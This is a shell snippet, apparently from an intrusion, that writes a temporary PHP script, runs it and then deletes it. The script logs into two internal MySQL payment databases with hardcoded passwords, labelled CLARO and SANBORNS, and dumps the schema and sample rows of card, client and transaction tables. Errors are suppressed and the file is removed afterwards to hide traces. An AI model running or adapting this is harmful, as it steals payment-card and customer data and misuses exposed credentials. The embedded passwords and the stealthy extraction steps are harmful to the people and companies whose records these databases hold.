cat > /tmp/t1dump.php << 'PHPEOF'
<?php
error_reporting(0);
function dump_table($conn, $db, $tb, $limit) {
    echo "--- SCHEMA $db.$tb ---\n";
    $r = mysqli_query($conn, "SHOW COLUMNS FROM `$db`.`$tb`");
    while ($row = mysqli_fetch_assoc($r)) { echo "  COL ".$row['Field']." ".$row['Type']."\n"; }
    echo "--- DATA $db.$tb (limit $limit) ---\n";
    $r = mysqli_query($conn, "SELECT * FROM `$db`.`$tb` LIMIT $limit");
    while ($row = mysqli_fetch_assoc($r)) {
        $line = array();
        foreach ($row as $k => $v) { $line[] = $k."=".substr((string)$v, 0, 80); }
        echo "  ROW: ".implode(" | ", $line)."\n";
    }
}
// T1_CLARO card table
$conn = @mysqli_init();
@mysqli_options($conn, MYSQLI_OPT_CONNECT_TIMEOUT, 6);
if (@mysqli_real_connect($conn, "172.27.141.26", "app_t1", "pySY8}7>ftpPz9S", "payment_t1", 3306)) {
    mysqli_set_charset($conn, "utf8");
    dump_table($conn, "payment_t1", "card", 15);
    dump_table($conn, "payment_t1", "client", 5);
    mysqli_close($conn);
} else { echo "CLARO FAIL\n"; }
// T1_SANBORNS client + transaction sample
$conn2 = @mysqli_init();
@mysqli_options($conn2, MYSQLI_OPT_CONNECT_TIMEOUT, 6);
if (@mysqli_real_connect($conn2, "172.27.141.6", "app_t1", "wUt22Us2CUh#+M=", "payment_t1", 3310)) {
    mysqli_set_charset($conn2, "utf8");
    dump_table($conn2, "payment_t1", "client", 5);
    dump_table($conn2, "payment_t1", "transaction", 5);
    mysqli_close($conn2);
} else { echo "SANBORNS FAIL\n"; }
echo "DUMP_DONE\n";
?>
PHPEOF
php /tmp/t1dump.php
rm -f /tmp/t1dump.php
